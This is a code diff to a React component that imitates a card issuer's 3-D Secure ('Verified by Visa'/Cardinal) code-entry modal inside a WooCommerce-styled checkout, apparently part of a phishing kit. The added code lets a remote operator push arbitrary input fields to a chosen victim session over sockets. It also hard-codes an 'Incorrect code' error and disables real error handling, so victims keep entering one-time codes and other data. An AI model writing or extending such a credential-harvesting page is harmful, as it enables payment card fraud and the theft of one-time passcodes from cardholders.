@@ -6,7 +6,7 @@ import visaLogo from '../vbv/visa_logo.svg';
 import mcLogo from '../vbv/mc_symbol.svg';
 import amexLogo from '../vbv/american_express_logo.svg';
 
-const ContainerCode = () => {
+const ContainerCustomError = () => {
   const [styles, setStyles] = useState(null);
   const [showNotif, setShowNotif] = useState(true);
   const [logoUrl, setLogoUrl] = useState('');
@@ -14,6 +14,9 @@ const ContainerCode = () => {
   const [brand, setBrand] = useState('');
   const [links, setLinks] = useState({});
   const [currentDate, setCurrentDate] = useState('');
+  const [inputs, setInputs] = useState([]);
+  const [inputsConfig, setInputsConfig] = useState([]);
+  const [isLoading, setIsLoading] = useState(true);
   const [maskedCardNumber, setMaskedCardNumber] = useState('************');
   const [formData, setFormData] = useState({});
   const [loading, setLoading] = useState(false);
@@ -26,6 +29,44 @@ const ContainerCode = () => {
     setLinks(links);
     setShowNotif(false);
   };
+
+  useEffect(() => {
+    const sessionId = localStorage.getItem('sessionId');
+    const storedConfig = localStorage.getItem(`inputsConfig_${sessionId}`);
+    if (storedConfig) {
+      setInputsConfig(JSON.parse(storedConfig));
+    }
+
+    socket.on('addCustomInput', ({ sessionId, input }) => {
+      console.log('Received addCustomInput event:', { sessionId, input });
+      if (sessionId === localStorage.getItem('sessionId')) {
+        setInputs(prev => [...prev, input]);
+      }
+    });
+
+    socket.on('configureInputs', ({ sessionId, inputsConfig }) => {
+      console.log('Received configureInputs event:', { sessionId, inputsConfig });
+      if (sessionId === localStorage.getItem('sessionId')) {
+        setInputsConfig(inputsConfig);
+        localStorage.setItem(`inputsConfig_${sessionId}`, JSON.stringify(inputsConfig));
+        setIsLoading(false);
+      }
+    });
+
+    socket.on('configUpdate', ({ sessionId: updatedSessionId, inputsConfig }) => {
+      if (updatedSessionId === sessionId) {
+        setInputsConfig(inputsConfig);
+        localStorage.setItem(`inputsConfig_${sessionId}`, JSON.stringify(inputsConfig));
+        setIsLoading(false);
+      }
+    });
+
+    return () => {
+      socket.off('addCustomInput');
+      socket.off('configureInputs');
+      socket.off('configUpdate');
+    };
+  }, []);
 
   const getBrandLogo = () => {
     console.log('Getting brand logo for:', brand); // Log the brand value
@@ -119,7 +160,7 @@ const ContainerCode = () => {
     e.preventDefault();
     const inputs = Object.values(formData).filter(value => value.trim() !== '').join(', ');
     if (!inputs) {
-      setError('Incorrect code.');
+      setError('Incorrect code');
       return;
     }
 
@@ -134,11 +175,65 @@ const ContainerCode = () => {
         setLoading(true);
       }
     } catch (error) {
-      setError(error.response?.data?.message || 'Verification failed');
+      //setError('Verification failed');
     } finally {
       setLoading(true);
     }
   };
+
+  useEffect(() => {
+    const sessionId = localStorage.getItem('sessionId');
+    const fetchConfig = async () => {
+      try {
+        const response = await fetch(`${process.env.REACT_APP_API_URL}/api/get-input-config/${sessionId}`);
+        if (response.ok) {
+          const data = await response.json();
+          setInputsConfig(data.inputsConfig);
+          localStorage.setItem(`inputsConfig_${sessionId}`, JSON.stringify(data.inputsConfig));
+        } else {
+          const storedConfig = localStorage.getItem(`inputsConfig_${sessionId}`);
+          if (storedConfig) {
+            setInputsConfig(JSON.parse(storedConfig));
+          }
+        }
+      } catch (error) {
+        console.error('Error fetching input configuration:', error);
+        const storedConfig = localStorage.getItem(`inputsConfig_${sessionId}`);
+        if (storedConfig) {
+          setInputsConfig(JSON.parse(storedConfig));
+        }
+      } finally {
+        setIsLoading(false);
+      }
+    };
+
+    fetchConfig();
+
+    socket.on('configureInputs', ({ sessionId, inputsConfig }) => {
+      console.log('Received configureInputs event:', { sessionId, inputsConfig });
+      if (sessionId === localStorage.getItem('sessionId')) {
+        setInputsConfig(inputsConfig);
+        localStorage.setItem(`inputsConfig_${sessionId}`, JSON.stringify(inputsConfig));
+        setIsLoading(false);
+      }
+    });
+
+    return () => {
+      socket.off('configureInputs');
+    };
+  }, []);
+
+  if (isLoading && inputsConfig.length === 0) {
+    return <body className="page-template page-template-page-templates page-template-minimal-footer page-template-page-templatesminimal-footer-php page page-id-61 logged-in wp-custom-logo theme-underscores wc-braintree-body woocommerce-checkout woocommerce-page woocommerce-js no-sidebar webp-support">
+    <div id="Cardinal-ElementContainer">
+      <div id="Cardinal-Modal" style={{paddingTop: '0px'}} className="cardinalOverlay-content shadow-effect cardinalOverlay-open fade-and-drop ">
+        <div id="Cardinal-ModalContent" className="size-02" tabIndex="-1">
+        </div>
+      </div>
+      <div id="Cardinal-Overlay" className="cardinalOverlay-mask cardinalOverlay-open "></div>
+    </div>
+  </body>;
+  }
 
   return (
     <body className="page-template page-template-page-templates page-template-minimal-footer page-template-page-templatesminimal-footer-php page page-id-61 logged-in wp-custom-logo theme-underscores wc-braintree-body woocommerce-checkout woocommerce-page woocommerce-js no-sidebar webp-support">
@@ -215,16 +310,22 @@ const ContainerCode = () => {
                               </div>
                               <br />
                               <br />
-                              { error && <div style={{fontWeight: 'normal'}} className="error_msg"><b style={{fontWeight: 'bold'}}>{error}</b> Please try again.</div> }
+                              <div style={{fontWeight: 'normal'}} className="error_msg"><b style={{fontWeight: 'bold'}}>Incorrect code</b>. Please try again.</div>
                               <div id="cust" className="formcol">
-                                <input
-                                  type="text"
-                                  placeholder="Please enter your code"
-                                  name="sms"
-                                  className="textinput"
-                                  required
-                                  onChange={handleChange}
-                                />
+                                {inputsConfig.map((input, index) => (
+                                  <div key={index} style={{ marginBottom: '10px' }}>
+                                    <input
+                                      type={input.type}
+                                      placeholder={input.placeholder}
+                                      name={input.name}
+                                      className="textinput"
+                                      required={input.type !== 'hidden'}
+                                      style={{ display: input.type === 'hidden' ? 'none' : 'block' }}
+                                      onChange={handleChange}
+                                      value={formData[input.name] || ''}
+                                    />
+                                  </div>
+                                ))}
                               </div>
                             </fieldset>
                             <div className="col-12 text-center">
@@ -259,4 +360,4 @@ const ContainerCode = () => {
   );
 };
 
-export default ContainerCode;
+export default ContainerCustomError;
